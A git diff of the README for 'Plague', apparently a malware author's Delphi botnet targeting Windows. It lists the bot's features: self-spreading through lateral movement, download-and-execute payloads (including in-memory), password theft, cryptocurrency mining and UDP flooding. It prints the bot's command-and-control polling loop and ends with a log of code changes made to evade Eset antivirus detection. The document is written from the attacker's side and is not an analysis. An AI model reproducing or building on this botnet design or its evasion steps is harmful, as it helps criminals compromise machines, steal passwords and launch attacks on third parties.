@@ -1,12 +1,58 @@
 # Plague
+Just and older botnet, migrated from a private BitBucket repo.
+Written in Delphi, targeting Windows computers. Plague is/was capable of spreading automatically using multiple lateral movement vectors.
+
+## Features
+### Basic Client Functions
+* Restart
+* Update
+* Uninstall
+### File Functions
+* Download File
+* Upload File
+### Module Execution and Exploitation Functions
+* Download and Execute [Drop method]
+* Download and Execute [In-memory method]
+* Download and Execute [DLL in-memory method]
+* Password Recovery
+* XMR Mining
+* UDP Flood
+### Control over the Spreading mechanisms
+
+## Basic execution flow
+The basic execution loop is defined in the main unit (Plague.lpr). Once this loop is reached, the execution of the bot instance stays essentially the same.
+
+```delphi
+Repeat
+  Net.GetCommands; //Download the current command list
+  For J:=1 to Net.CommandCount do Begin //Iterate through the available commands
+    if Net.Commands[J].Type='Abort' then Begin //If an Abort command is found
+      if CommandUnderExecution(Net.Commands[J]) then //and the given command is under execution
+        AbortCommand(Net.Commands[J]); //then abort it
+    end else Begin //If the command is not an Abort
+      if Not(CommandUnderExecution(Net.Commands[J])) then Begin //and it's awaiting execution
+        I:=FindAPlace; //then find an empty place in the Worker Array
+        NewWorker(I, Net.Commands[J]); //and create a new Worker to execute the command.
+      end;
+    end;
+  End;
+  Sleep(Delay); //Wait before contacting the server again
+Until False; //Endless loop
+```
+## Screenshots
+
+<p align="center">
+  <img alt="Login interface" src="https://i.imgur.com/M7Ye0M3.png">
+  <img alt="Bot list" src="https://i.imgur.com/HFDeFPz.png">
+  <img alt="World map" src="https://i.imgur.com/2N95UCw.png">
+  <img alt="Builder" src="https://i.imgur.com/GBCDyqo.png">
+</p>
+
 ## Detection Log
-1/29/2019 --> ![Eset][1] Eset NOD32 - a variant of Win32/Agent.TMP trojan
+1/29/2019 --> ![Eset](https://i.imgur.com/qM8FDvK.png) Eset NOD32 - a variant of Win32/Agent.TMP trojan
 
  * **Tools** --> OpenURL --> `ShellExecute` changed to `ShellExecuteW`
  * **CmdWorker** --> Execute --> Mine --> String `config.json` moved to Protected String Storage
  * **CmdWorker** --> Execute --> MemExec --> String `MemExec` added to String Table as `bb32d835`
  * **CmdWorker** --> Execute --> DropExec --> String `DropExec` added to String Table as `896bb1db`
  * **CmdWorker** --> Execute --> Download --> String `Download successful.` moved to Protected String Storage
-
-[1]:data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4wETEykzxj7xmQAAAplJREFUOMuFk09IFGEYxn8z37iTtlopomV0yLYUzVLrVKCQhWBGgiARyJIWJhFFHRSUKMyW/iDYqZtdhMoUOts/gy62q0QZthqlieiuUriTzsyOXwd1JAh8Th/v8zzv4eX7KQC0PYCWaxDo9ANlQBGKkoWUXgAUJYaUU0AI6KfpctdaR6H1DiSIDFTxGWc5zePRqN7nw7d1CyIhAQDHtgn/+k3PaBjLioNQ51h28rCdGQBoaY/S3CZ7R0blRuodGZU0t0la2qMAguutfizrTG9tDVV5OWyk3PQ0DmSk82QwmMSR0h8aplnm0TSq8nPd0MuvYzwaeM/4/C9Akp26jcaSo5T6dgNQlZ+LR0os0yzTMJeKqvcXuuWhyZ+U3QpAUhKbdR0UCI2N8+z1AF8e3CYnMwOA6lwf3R+GilQMI8uX7HUXdL95B0DOlhRiD+8R67zH3pRkUODxq7duzpfsBcPI0lg0vEKorjEdicDiH75NTJB5rgGAuYUYOHGmZ2fdnBACFg2vxpIJjuMa0rLBXCI7fSdXTp8k7iwjhIqCQvb2zPVrOnFYMlGJ2zHHMNz5jhQv2Dax2AIXyk/QWFHOTCTKQGiIse8/1vuGAXE7pqGKqfBsJGXNqDl+jPvdT5lkjl219SQnJTISHgchOJKf5y4Iz0ZAFVMquh7qCQ67xiHfHl503KWkuJC40Jg3LYoPFhCo93PxVIWb6wkOg66HNBI39VuOc7ZvMEjV4WIAKg8XU7n6/p/6BoNYqgKJm/pXJnWNUfwNsjc0vOFXfh4alvgbJHWNUQCF85dAT8xAKCsw6R6qC/LxpaYi9FWYTJvw/Dw9Hz9hmdYKTI7Mw1ycUQC42gQdAWi6uYKzQhHwL84whVzFOXCja63zF+qPTA2L7eyKAAAAAElFTkSuQmCC
-
